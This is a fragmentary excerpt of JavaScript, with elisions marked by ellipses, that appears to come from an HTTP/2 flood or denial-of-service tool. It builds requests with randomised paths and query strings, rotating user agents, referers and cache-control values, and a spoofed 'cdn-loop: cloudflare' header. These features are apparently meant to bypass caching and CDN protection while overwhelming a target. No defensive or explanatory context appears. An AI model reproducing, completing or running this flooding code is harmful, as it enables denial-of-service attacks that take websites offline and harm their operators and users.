...
const RESTART_DELAY = 1000;
 ...
 headers[":path"] = (parsedTarget.path || "/") + "?" + randstr(8) + "=" + generateRandomString(12, 20) + "&" + randstr(6) + "=" + generateRandomString(10, 18) + "&" + randstr(4) + "=" + generateRandomString(8, 14);
 headers["accept-language"] = lang;
 headers["user-agent"] = uap1;
 headers["referer"] = randomReferer;
 headers["accept-encoding"] = encoding;
 headers["cdn-loop"] = "cloudflare";
 headers["sec-ch-ua-mobile"] = secChMobile;
...
function shuffleObject(obj) {
  ...
  return shuffledObject;
             ...
             generateRandomString(3,8) + 
             ["", ".html", ".php", ".json", "/"][Math.floor(Math.random()*5)] + 
             "?" + randstr(5) + "=" + generateRandomString(8,15) + 
             "&" + randstr(4) + "=" + generateRandomString(6,12),
                    "cache-control": ["no-cache", "max-age=0", "private", "public"][Math.floor(Math.random()*4)],
                    "user-agent": uap1,
